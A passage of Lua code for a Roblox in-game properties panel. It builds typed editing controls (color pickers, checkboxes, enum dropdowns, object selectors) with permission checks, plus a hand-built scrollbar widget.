		colorPalette.Visible = false
	end
	
	local function toggle()
		colorPalette.Visible = not colorPalette.Visible
	end
	
	local colorBox = Instance.new("TextButton", frame)
	colorBox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
	colorBox.Size = UDim2.new(0, BrickColors.BoxSize, 0, BrickColors.BoxSize)
	colorBox.Text = ""
	colorBox.MouseButton1Click:connect(function()
		if not readOnly then
			toggle()
		end
	end)
	
	if readOnly then
		colorBox.AutoButtonColor = false
	end
	
	local spacingBefore = (Styles.Margin * 2) + BrickColors.BoxSize
	
	local propertyLabel = CreateTextButton(readOnly, function()
		if not readOnly then
			toggle()
		end
	end)
	propertyLabel.Size = UDim2.new(1, (-1 * spacingBefore) - Styles.Margin, 1, 0)
	propertyLabel.Position = UDim2.new(0, spacingBefore, 0, 0)
	propertyLabel.Parent = frame
	
	local size = (1 / BrickColors.ColorsPerRow)
	
	for index = 0, 127 do
		local brickColor = BrickColor.palette(index)
		local color3 = brickColor.Color
		
		local x = size * (index % BrickColors.ColorsPerRow)
		local y = size * math.floor(index / BrickColors.ColorsPerRow)
	
		local brickColorBox = Instance.new("TextButton")
		brickColorBox.Text = ""
		brickColorBox.Size = UDim2.new(size,0,size,0)
		brickColorBox.BackgroundColor3 = color3
		brickColorBox.Position = UDim2.new(x, 0, y, 0)
		brickColorBox.ZIndex = colorPalette.ZIndex
		brickColorBox.Parent = colorPalette
	
		brickColorBox.MouseButton1Click:connect(function()
			hide()
			onClick(brickColor)
		end)
	end
	
	return frame,propertyLabel,colorBox
end

local function CreateColor3Control(readOnly, onClick)
	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1,0,1,0)
	frame.BackgroundTransparency = 1
	
	local colorBox = Instance.new("TextButton", frame)
	colorBox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
	colorBox.Size = UDim2.new(0, BrickColors.BoxSize, 0, BrickColors.BoxSize)
	colorBox.Text = ""
	colorBox.AutoButtonColor = false
	
	local spacingBefore = (Styles.Margin * 2) + BrickColors.BoxSize
	local box = CreateTextBox(readOnly)
	box.Size = UDim2.new(1, (-1 * spacingBefore) - Styles.Margin, 1, 0)
	box.Position = UDim2.new(0, spacingBefore, 0, 0)
	box.Parent = frame
	
	return frame,box,colorBox
end

function CreateCheckbox(value, readOnly, onClick)
	local checked = value
	local mouseover = false

	local checkboxFrame = Instance.new("ImageButton")
	checkboxFrame.Size = UDim2.new(0, Sprite.Width, 0, Sprite.Height)
	checkboxFrame.BackgroundTransparency = 1
	checkboxFrame.ClipsDescendants = true
	--checkboxFrame.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)

	local spritesheetImage = Instance.new("ImageLabel", checkboxFrame)
	spritesheetImage.Name = "SpritesheetImageLabel"
	spritesheetImage.Size = UDim2.new(0, Spritesheet.Width, 0, Spritesheet.Height)
	spritesheetImage.Image = Spritesheet.Image
	spritesheetImage.BackgroundTransparency = 1
	
	local function updateSprite()
		local spriteName = GetCheckboxImageName(checked, readOnly, mouseover)
		local spritePosition = SpritePosition(spriteName)
		spritesheetImage.Position = UDim2.new(0, -1 * spritePosition[1], 0, -1 * spritePosition[2])
	end
	
	local function setValue(val)
		checked = val
		updateSprite()
	end

	if not readOnly then
		checkboxFrame.MouseEnter:connect(function() mouseover = true updateSprite() end)
		checkboxFrame.MouseLeave:connect(function() mouseover = false updateSprite() end)
		checkboxFrame.MouseButton1Click:connect(function()
			onClick(checked)
		end)
	end
	
	updateSprite()
	
	return checkboxFrame, setValue
end



-- Code for handling controls of various data types --

local Controls = {}

Controls["default"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	local box = CreateTextBox(readOnly)
	box.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	box.Position = UDim2.new(0, Styles.Margin, 0, 0)

	local function update()
		local value = object[propertyName]
		box.Text = ToString(value, propertyType)
	end
	
	if not readOnly then
		box.FocusLost:connect(function(enterPressed)
			Set(object, propertyData, ToValue(box.Text,propertyType))
			update()
		end)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return box
end

Controls["bool"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local checked = object[propertyName]
	
	local checkbox, setValue = CreateCheckbox(checked, readOnly, function(value)
		Set(object, propertyData, not checked)
	end)
	checkbox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
	
	setValue(checked)
	
	local function update()
		checked = object[propertyName]
		setValue(checked)
	end
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	if object:IsA("BoolValue") then
		object.Changed:connect(function(val)
			update()
		end)
	end
	
	update()
	
	return checkbox
end

Controls["BrickColor"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]

	local frame,label,brickColorBox = CreateBrickColor(readOnly, function(brickColor)
		Set(object, propertyData, brickColor)
	end)
	
	local function update()
		local value = object[propertyName]
		brickColorBox.BackgroundColor3 = value.Color
		label.Text = tostring(value)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return frame
end

Controls["Color3"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]

	local frame,textBox,colorBox = CreateColor3Control(readOnly)
	
	textBox.FocusLost:connect(function(enterPressed)
		Set(object, propertyData, ToValue(textBox.Text,"Color3"))
		local value = object[propertyName]
		colorBox.BackgroundColor3 = value
		textBox.Text = ToString(value, "Color3")
	end)
			
	local function update()
		local value = object[propertyName]
		colorBox.BackgroundColor3 = value
		textBox.Text = ToString(value, "Color3")
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return frame
end

Controls["Enum"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	local enumName = object[propertyName].Name
	
	local enumNames = {}
	for _,enum in pairs(Enum[tostring(propertyType)]:GetEnumItems()) do
		table.insert(enumNames, enum.Name)
	end
	
	local dropdown, propertyLabel = CreateDropDown(enumNames, enumName, readOnly, function(value)
		Set(object, propertyData, value)
	end)
	--dropdown.Parent = frame
	
	local function update()
		local value = object[propertyName].Name
		propertyLabel.Text = tostring(value)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return dropdown
end

Controls["Object"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	local box = CreateObject(readOnly,function()end)
	box.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	box.Position = UDim2.new(0, Styles.Margin, 0, 0)

	local function update()
		if AwaitingObjectObj == object then
			if AwaitingObjectValue == true then
				box.Text = "Select an Object"
				return
			end
		end
		local value = object[propertyName]
		box.Text = ToString(value, propertyType)
	end
	
	if not readOnly then
		box.MouseButton1Click:connect(function()
			if AwaitingObjectValue then
				AwaitingObjectValue = false
				update()
				return
			end
			AwaitingObjectValue = true
			AwaitingObjectObj = object
			AwaitingObjectProp = propertyData
			box.Text = "Select an Object"
		end)
		
		box.Cancel.Visible = true
		box.Cancel.MouseButton1Click:connect(function()
			object[propertyName] = nil
		end)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	if object:IsA("ObjectValue") then
		object.Changed:connect(function(val)
			update()
		end)
	end
	
	return box
end

function GetControl(object, propertyData, readOnly)
	local propertyType = propertyData["ValueType"]
	local control = nil
	
	if Controls[propertyType] then
		control = Controls[propertyType](object, propertyData, readOnly)
	elseif RbxApi.IsEnum(propertyType) then
		control = Controls["Enum"](object, propertyData, readOnly)
	else
		control = Controls["default"](object, propertyData, readOnly)
	end
	return control
end
-- Permissions

function CanEditObject(object)
	local player = Players.LocalPlayer
	local character = player.Character
	return Permissions.CanEdit
end

function CanEditProperty(object,propertyData)
	local tags = propertyData["tags"]
	for _,name in pairs(tags) do
		if name == "readonly" then
			return false
		end
	end
	return CanEditObject(object)
end

--RbxApi
local function PropertyIsHidden(propertyData)
	local tags = propertyData["tags"]
	for _,name in pairs(tags) do
		if name == "deprecated"
			or name == "hidden"
			or name == "writeonly" then
			return true
		end
	end
	return false
end

function Set(object, propertyData, value)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	if value == nil then return end
	
	for i,v in pairs(GetSelection()) do
		if CanEditProperty(v,propertyData) then
			pcall(function()
				--print("Setting " .. propertyName .. " to " .. tostring(value))
				v[propertyName] = value
			end)
		end
	end
end

function CreateRow(object, propertyData, isAlternateRow)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	local propertyValue = object[propertyName]
	--rowValue, rowValueType, isAlternate
	local backColor = Row.BackgroundColor;
	if (isAlternateRow) then
		backColor = Row.BackgroundColorAlternate
	end
	
	local readOnly = not CanEditProperty(object, propertyData)
	if propertyType == "Instance" or propertyName == "Parent" then readOnly = true end

	local rowFrame = Instance.new("Frame")
	rowFrame.Size = UDim2.new(1,0,0,Row.Height)
	rowFrame.BackgroundTransparency = 1
	rowFrame.Name = 'Row'

	local propertyLabelFrame = CreateCell()
	propertyLabelFrame.Parent = rowFrame
	propertyLabelFrame.ClipsDescendants = true
	
	local propertyLabel = CreateLabel(readOnly)
	propertyLabel.Text = propertyName
	propertyLabel.Size = UDim2.new(1, -1 * Row.TitleMarginLeft, 1, 0)
	propertyLabel.Position = UDim2.new(0, Row.TitleMarginLeft, 0, 0)
	propertyLabel.Parent = propertyLabelFrame

	local propertyValueFrame = CreateCell()
	propertyValueFrame.Size = UDim2.new(0.5, -1, 1, 0)
	propertyValueFrame.Position = UDim2.new(0.5, 0, 0, 0)
	propertyValueFrame.Parent = rowFrame

	local control = GetControl(object, propertyData, readOnly)
	control.Parent = propertyValueFrame

	rowFrame.MouseEnter:connect(function()
		propertyLabelFrame.BackgroundColor3 = Row.BackgroundColorMouseover
		propertyValueFrame.BackgroundColor3 = Row.BackgroundColorMouseover
	end)
	rowFrame.MouseLeave:connect(function()
		propertyLabelFrame.BackgroundColor3 = backColor
		propertyValueFrame.BackgroundColor3 = backColor
	end)
	
	propertyLabelFrame.BackgroundColor3 = backColor
	propertyValueFrame.BackgroundColor3 = backColor
	
	return rowFrame
end

function ClearPropertiesList()
	for _,instance in pairs(ContentFrame:GetChildren()) do
		instance:Destroy()
	end
end

local selection = Gui:FindFirstChild("Selection", 1)
print(selection)

function displayProperties(props)
	for i,v in pairs(props) do
		pcall(function()
			local a = CreateRow(v.object, v.propertyData, ((numRows % 2) == 0))
			a.Position = UDim2.new(0,0,0,numRows*Row.Height)
			a.Parent = ContentFrame
			numRows = numRows + 1
		end)
	end
end

function checkForDupe(prop,props)
	for i,v in pairs(props) do
		if v.propertyData.Name == prop.Name and v.propertyData.ValueType == prop.ValueType then
			return true
		end
	end
	return false
end

function sortProps(t)
	table.sort(t, 
		function(x,y) return x.propertyData.Name < y.propertyData.Name
	end)
end

function showProperties(obj)
	ClearPropertiesList()
	if obj == nil then return end
	local propHolder = {}
	local foundProps = {}
	numRows = 0
	for _,nextObj in pairs(obj) do
		if not foundProps[nextObj.className] then
			foundProps[nextObj.className] = true
			for i,v in pairs(RbxApi.GetProperties(nextObj.className)) do
				local suc, err = pcall(function()
					if not (PropertyIsHidden(v)) and not checkForDupe(v,propHolder) then
						if string.find(string.lower(v.Name),string.lower(propertiesSearch.Text)) or not searchingProperties() then
							table.insert(propHolder,{propertyData = v, object = nextObj})
						end
					end
				end)
				--[[if not suc then 
					warn("Problem getting the value of property " .. v.Name .. " | " .. err)
				end	--]]
			end
		end
	end
	sortProps(propHolder)
	displayProperties(propHolder)
	ContentFrame.Size = UDim2.new(1, 0, 0, numRows * Row.Height)
	scrollBar.ScrollIndex = 0
	scrollBar.TotalSpace = numRows * Row.Height
	scrollBar.Update()
end

----------------------------------------------------------------
-----------------------SCROLLBAR STUFF--------------------------
----------------------------------------------------------------
----------------------------------------------------------------
local ScrollBarWidth = 16

local ScrollStyles = {
	Background      = Color3.new(233/255, 233/255, 233/255);
	Border          = Color3.new(149/255, 149/255, 149/255);
	Selected        = Color3.new( 63/255, 119/255, 189/255);
	BorderSelected  = Color3.new( 55/255, 106/255, 167/255);
	Text            = Color3.new(  0/255,   0/255,   0/255);
	TextDisabled    = Color3.new(128/255, 128/255, 128/255);
	TextSelected    = Color3.new(255/255, 255/255, 255/255);
	Button          = Color3.new(221/255, 221/255, 221/255);
	ButtonBorder    = Color3.new(149/255, 149/255, 149/255);
	ButtonSelected  = Color3.new(255/255,   0/255,   0/255);
	Field           = Color3.new(255/255, 255/255, 255/255);
	FieldBorder     = Color3.new(191/255, 191/255, 191/255);
	TitleBackground = Color3.new(178/255, 178/255, 178/255);
}
do
	local ZIndexLock = {}
	function SetZIndex(object,z)
		if not ZIndexLock[object] then
			ZIndexLock[object] = true
			if object:IsA'GuiObject' then
				object.ZIndex = z
			end
			local children = object:GetChildren()
			for i = 1,#children do
				SetZIndex(children[i],z)
			end
			ZIndexLock[object] = nil
		end
	end
end
function SetZIndexOnChanged(object)
	return object.Changed:connect(function(p)
		if p == "ZIndex" then
			SetZIndex(object,object.ZIndex)
		end
	end)
end
function Create(ty,data)
	local obj
	if type(ty) == 'string' then
		obj = Instance.new(ty)
	else
		obj = ty
	end
	for k, v in pairs(data) do
		if type(k) == 'number' then
			v.Parent = obj
		else
			obj[k] = v
		end
	end
	return obj
end
-- returns the ascendant ScreenGui of an object
function GetScreen(screen)
	if screen == nil then return nil end
	while not screen:IsA("ScreenGui") do
		screen = screen.Parent
		if screen == nil then return nil end
	end
	return screen
end
-- AutoButtonColor doesn't always reset properly
function ResetButtonColor(button)
	local active = button.Active
	button.Active = not active
	button.Active = active
end

function ArrowGraphic(size,dir,scaled,template)
	local Frame = Create('Frame',{
		Name = "Arrow Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size,0,size);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	local transform
	if dir == nil or dir == 'Up' then
		function transform(p,s) return p,s end
	elseif dir == 'Down' then
		function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
	elseif dir == 'Left' then
		function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	elseif dir == 'Right' then
		function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	end

	local scale
	if scaled then
		function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
	else
		function scale(p,s) return p,s end
	end

	local o = math.floor(size/4)
	if size%2 == 0 then
		local n = size/2-1
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,(i+1)*2,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	else
		local n = (size-1)/2
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,i*2+1,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	end
	if size%4 > 1 then
		local t = template:Clone()
		local p,s = scale(transform(
			UDim2.new(0,0,0,size-o-1),
			UDim2.new(0,size,0,1)
		))
		t.Position = p
		t.Size = s
		t.Parent = Frame
	end
	return Frame
end

function GripGraphic(size,dir,spacing,scaled,template)
	local Frame = Create('Frame',{
		Name = "Grip Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size.x,0,size.y);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	spacing = spacing or 2

	local scale
	if scaled then
		function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
	else
		function scale(p) return p end
	end

	if dir == 'Vertical' then
		for i=0,size.x-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,1,0,size.y))
			t.Position = scale(UDim2.new(0,i,0,0))
			t.Parent = Frame
		end
	elseif dir == nil or dir == 'Horizontal' then
		for i=0,size.y-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,size.x,0,1))
			t.Position = scale(UDim2.new(0,0,0,i))
			t.Parent = Frame
		end
	end

	return Frame
end

do
	local mt = {
		__index = {
			GetScrollPercent = function(self)
				return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
			end;
			CanScrollDown = function(self)
				return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
			end;
			CanScrollUp = function(self)
				return self.ScrollIndex > 0
			end;
			ScrollDown = function(self)
				self.ScrollIndex = self.ScrollIndex + self.PageIncrement
				self:Update()
			end;
			ScrollUp = function(self)
				self.ScrollIndex = self.ScrollIndex - self.PageIncrement
				self:Update()
			end;
			ScrollTo = function(self,index)
				self.ScrollIndex = index
				self:Update()
			end;
			SetScrollPercent = function(self,percent)
				self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
				self:Update()
			end;
		};
	}
	mt.__index.CanScrollRight = mt.__index.CanScrollDown
	mt.__index.CanScrollLeft = mt.__index.CanScrollUp
	mt.__index.ScrollLeft = mt.__index.ScrollUp
	mt.__index.ScrollRight = mt.__index.ScrollDown

	function ScrollBar(horizontal)
		-- create row scroll bar
		local ScrollFrame = Create('Frame',{
			Name = "ScrollFrame";
			Position = horizontal and UDim2.new(0,0,1,-ScrollBarWidth) or UDim2.new(1,-ScrollBarWidth,0,0);
			Size = horizontal and UDim2.new(1,0,0,ScrollBarWidth) or UDim2.new(0,ScrollBarWidth,1,0);
			BackgroundTransparency = 1;
			Create('ImageButton',{
				Name = "ScrollDown";
				Position = horizontal and UDim2.new(1,-ScrollBarWidth,0,0) or UDim2.new(0,0,1,-ScrollBarWidth);
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollUp";
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollBar";
				Size = horizontal and UDim2.new(1,-ScrollBarWidth*2,1,0) or UDim2.new(1,0,1,-ScrollBarWidth*2);
				Position = horizontal and UDim2.new(0,ScrollBarWidth,0,0) or UDim2.new(0,0,0,ScrollBarWidth);
				AutoButtonColor = false;
				BackgroundColor3 = Color3.new(0.94902, 0.94902, 0.94902);
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
				Create('ImageButton',{
					Name = "ScrollThumb";
					AutoButtonColor = false;
					Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
					BackgroundColor3 = ScrollStyles.Button;
					BorderColor3 = ScrollStyles.Border;
					--BorderSizePixel = 0;
				});
			});
		})

		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = ScrollStyles.Border;
		})
		local graphicSize = ScrollBarWidth/2

		local ScrollDownFrame = ScrollFrame.ScrollDown
			local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
			ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollDownGraphic.Parent = ScrollDownFrame
		local ScrollUpFrame = ScrollFrame.ScrollUp
			local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
			ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollUpGraphic.Parent = ScrollUpFrame
		local ScrollBarFrame = ScrollFrame.ScrollBar
		local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
		do
			local size = ScrollBarWidth*3/8
			local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
			Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
			Decal.Parent = ScrollThumbFrame
		end

		local MouseDrag = Create('ImageButton',{
			Name = "MouseDrag";
			Position = UDim2.new(-0.25,0,-0.25,0);
			Size = UDim2.new(1.5,0,1.5,0);
			Transparency = 1;
			AutoButtonColor = false;
			Active = true;
			ZIndex = 10;
		})

		local Class = setmetatable({
			GUI = ScrollFrame;
			ScrollIndex = 0;
			VisibleSpace = 0;
			TotalSpace = 0;
			PageIncrement = 1;
		},mt)

		local UpdateScrollThumb
		if horizontal then
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,ScrollBarWidth)
				if ScrollThumbFrame.AbsoluteSize.x < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.x
				ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
			end
		else
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,Class.VisibleSpace/Class.TotalSpace,0)
				if ScrollThumbFrame.AbsoluteSize.y < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.y
				ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
			end
		end

		local lastDown
		local lastUp
		local scrollStyle = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0}
		local scrollStyle_ds = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0.7}

		local function Update()
			local t = Class.TotalSpace
			local v = Class.VisibleSpace
			local s = Class.ScrollIndex
			if v <= t then
				if s > 0 then
					if s + v > t then
						Class.ScrollIndex = t - v
					end
				else
					Class.ScrollIndex = 0
				end
			else
				Class.ScrollIndex = 0
			end

			if Class.UpdateCallback then
				if Class.UpdateCallback(Class) == false then
					return
				end
			end

			local down = Class:CanScrollDown()
			local up = Class:CanScrollUp()
			if down ~= lastDown then
				lastDown = down
				ScrollDownFrame.Active = down
				ScrollDownFrame.AutoButtonColor = down
				local children = ScrollDownGraphic:GetChildren()
				local style = down and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			if up ~= lastUp then
				lastUp = up
				ScrollUpFrame.Active = up
				ScrollUpFrame.AutoButtonColor = up
				local children = ScrollUpGraphic:GetChildren()
				local style = up and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			ScrollThumbFrame.Visible = down or up
			UpdateScrollThumb()
		end
		Class.Update = Update

		SetZIndexOnChanged(ScrollFrame)

		local scrollEventID = 0
		ScrollDownFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollDownFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollDown()
			wait(0.2) -- delay before auto scroll
			while scrollEventID == current do
				Class:ScrollDown()
				if not Class:CanScrollDown() then break end
				wait()
			end
		end)

		ScrollDownFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		ScrollUpFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollUpFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollUp()
			wait(0.2)
			while scrollEventID == current do
				Class:ScrollUp()
				if not Class:CanScrollUp() then break end
				wait()
			end
		end)

		ScrollUpFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		if horizontal then
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if x > ScrollThumbFrame.AbsolutePosition.x then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x > ScrollThumbFrame.AbsolutePosition.x then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		else
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if y > ScrollThumbFrame.AbsolutePosition.y then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y > ScrollThumbFrame.AbsolutePosition.y then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		end

		if horizontal then
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
					local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
					local bar_abs_one = bar_abs_pos + bar_drag
					x = x - mouse_offset
					x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
					x = x - bar_abs_pos
					Class:SetScrollPercent(x/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		else
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
					local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
					local bar_abs_one = bar_abs_pos + bar_drag
					y = y - mouse_offset
					y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
					y = y - bar_abs_pos
					Class:SetScrollPercent(y/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		end

		function Class:Destroy()
			ScrollFrame:Destroy()
			MouseDrag:Destroy()
			for k in pairs(Class) do
				Class[k] = nil
			end
			setmetatable(Class,nil)
		end

		Update()

		return Class
	end
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(1, -1 * ScrollBarWidth, 1, 0)
MainFrame.Position = UDim2.new(0, 0, 0, 0)
MainFrame.BackgroundTransparency = 1
MainFrame.ClipsDescendants = true
MainFrame.Parent = PropertiesFrame

ContentFrame = Instance.new("Frame")
ContentFrame.Name = "ContentFrame"
ContentFrame.Size = UDim2.new(1, 0, 0, 0)
ContentFrame.BackgroundTransparency = 1
ContentFrame.Parent = MainFrame

scrollBar = ScrollBar(false)
scrollBar.PageIncrement = 1
Create(scrollBar.GUI,{
	Position = UDim2.new(1,-ScrollBarWidth,0,0);
	Size = UDim2.new(0,ScrollBarWidth,1,0);
	Parent = PropertiesFrame;
})

scrollBarH = ScrollBar(true)
scrollBarH.PageIncrement = ScrollBarWidth
Create(scrollBarH.GUI,{
	Position = UDim2.new(0,0,1,-ScrollBarWidth);
	Size = UDim2.new(1,-ScrollBarWidth,0,ScrollBarWidth);
	Visible = false;
	Parent = PropertiesFrame;
})

do
	local listEntries = {}
	local nameConnLookup = {}
	
	function scrollBar.UpdateCallback(self)
